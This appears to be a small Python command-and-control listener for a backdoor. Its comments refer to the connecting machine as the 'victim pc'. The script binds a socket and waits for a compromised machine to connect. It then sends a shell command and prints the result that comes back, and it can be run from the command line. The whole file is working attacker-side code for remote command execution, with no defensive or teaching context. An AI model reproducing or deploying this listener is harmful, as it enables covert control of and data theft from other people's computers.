#Imports required for this file
import socket
import sys

#Main function
def notReal(HOST, PORT, command = "ls -l"):
	#Creates a socket which is later used to send data to victim
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	#Makes socket reusable for multiple connections
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	#Main try statement, fails if given ip adress is not sending messages
	try:
		#Opens a socket which listens to messages
		s.bind((HOST, PORT))
		s.listen(0)

		#Saves connection data of victim pc connecting to open socket
		conn, addr = s.accept()

		#Sends a command back to the victim pc
		conn.sendall(command.encode())
		
		#Reads result of command sent to victim pc
		result = conn.recv(1024)

		#Closes the connection
		conn.close()

		#Prints result of command being executed on victim pc
		print("\n" + result.decode())

	#Catches exception if ip is not correct and prints error message
	except:
		print("unable to set up host: wrong ip")

#Used when realtime mode is activated, runs this function in a separate console
#Reason being that opening a socket does not give a return statement, and thus the console that this function is ran in cannot be used for other commands
try:
	sys.argv[1]
	print("attempting to connect to target...")
	notReal(sys.argv[1], int(sys.argv[2]), sys.argv[3])
except:
        pass

